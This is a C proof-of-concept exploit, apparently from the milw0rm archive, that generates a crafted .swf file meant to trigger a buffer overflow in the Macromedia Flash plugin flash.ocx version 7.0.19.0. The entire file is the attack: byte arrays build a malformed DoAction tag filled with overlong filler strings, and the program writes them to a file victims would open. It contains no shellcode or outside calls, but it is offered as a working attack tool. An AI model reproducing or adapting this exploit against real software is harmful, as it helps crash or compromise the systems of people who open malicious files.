/*
 
 * ********************************************************* *
 * Macromedia Flash Plugin - Buffer Overflow in flash.ocx    *
 * ********************************************************* *
 * Version: v7.0.19.0                                        *
 * PoC coded by: BassReFLeX                                  *
 * Date: 11 Oct 2005                                         *
 * ********************************************************* *
 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void usage(char* file);

/*
<swf>
...
</swf>
*/
char SWF[] = "<swf>";
char SWF_[] = "</swf>";

//[SetBackgroundColor]
char SetBackgroundColor[] = "\x43\x02\xff\x00\x00";

//[DoAction] 1 pwn j00r 455!
char DoAction[] = "\x3c\x03\x9b\x08\x00\x41\x41\x41\x41\x41\x41\x41\x41\x00\x40\x00"
		  "\x42\x42\x42\x42\x42\x42\x42\x42\x00\x43\x43\x43\x43\x43\x43\x43"
                  "\x43\x00\x44\x44\x44\x44\x44\x44\x44\x44\x00\x45\x45\x45\x45\x45"
                  "\x45\x45\x45\x00\x46\x46\x46\x46\x46\x46\x46\x46\x00\x00";

//[ShowFrame]
char ShowFrame[] = "\x40\x00";

//[End]
char End[] = "\x00\x00";

int main(int argc,char* argv[])
{
    system("cls");
    printf("\n* ********************************************************* *");
    printf("\n* Macromedia Flash Plugin - Buffer Overflow in flash.ocx    *");
    printf("\n* ********************************************************* *");
    printf("\n* Version: v7.0.19.0                                        *");
    printf("\n* Date: 11 Oct 2005                                         *");
	printf("\n* ProofOfConcept(POC) coded by: BassReFLeX                  *");
    printf("\n* ********************************************************* *");
    
    if ( argc!=2 )
    {
        usage(argv[0]);
    }
    
    FILE *f;
    f = fopen(argv[1],"w");
    if ( !f )
    {
        printf("\nFile couldn't open!");
        exit(1);
    }
                         
    printf("\n\nWriting crafted .swf file . . .");
    fwrite(SWF,1,sizeof(SWF),f);
    fwrite("\n",1,1,f);
    fwrite(SetBackgroundColor,1,sizeof(SetBackgroundColor),f);
    fwrite("\n",1,1,f);
    fwrite(DoAction,1,sizeof(DoAction),f);
    fwrite("\n",1,1,f);
	fwrite(ShowFrame,1,sizeof(ShowFrame),f);
    fwrite("\n",1,1,f);
	fwrite(End,1,sizeof(End),f);
	fwrite("\n",1,1,f);
	fwrite(SWF_,1,sizeof(SWF_),f);
	printf("\nFile created successfully!");
    printf("\nFilename: %s",argv[1]);
    return 0;
}        

void usage(char* file)
{
    printf("\n\n");
    printf("\n%s <Filename>",file);
    printf("\n\nFilename = .swf crafted file. Eg: overflow.swf");
    exit(1);
}

// milw0rm.com [2005-11-18]